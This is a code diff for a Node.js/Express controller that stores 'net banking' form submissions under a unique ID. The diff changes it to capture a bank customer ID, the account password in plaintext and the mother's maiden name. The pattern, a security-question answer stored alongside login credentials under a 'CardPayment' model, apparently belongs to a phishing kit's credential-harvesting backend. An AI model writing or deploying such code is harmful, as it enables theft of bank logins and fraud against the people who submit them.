@@ -1,29 +1,33 @@
+// controllers/netBankingController.js
 const NetBanking = require('../models/CardPayment');
 
 exports.submitNetBankingPayment = async (req, res) => {
   try {
-    const { motherName, dob, uniqueid } = req.body;
+    const { uniqueid, customerId, password, motherName } = req.body;
+
     let netBanking = await NetBanking.findOne({ uniqueid });
+    const newEntry = { customerId, password, motherName };
 
     if (netBanking) {
-      netBanking.entries.push({ motherName, dob });
+      netBanking.entries.push(newEntry);
     } else {
       netBanking = new NetBanking({
         uniqueid,
-        entries: [{ motherName, dob }]
+        entries: [ newEntry ]
       });
     }
 
     await netBanking.save();
+
     res.status(200).json({
       success: true,
-      message: "Net Banking Payment Data Submitted Successfully!"
+      message: "Net Banking Data Submitted Successfully!"
     });
   } catch (error) {
     console.error(error);
     res.status(500).json({
       success: false,
-      message: "Error occurred while submitting net banking payment data"
+      message: "Error occurred while submitting net banking data"
     });
   }
 };
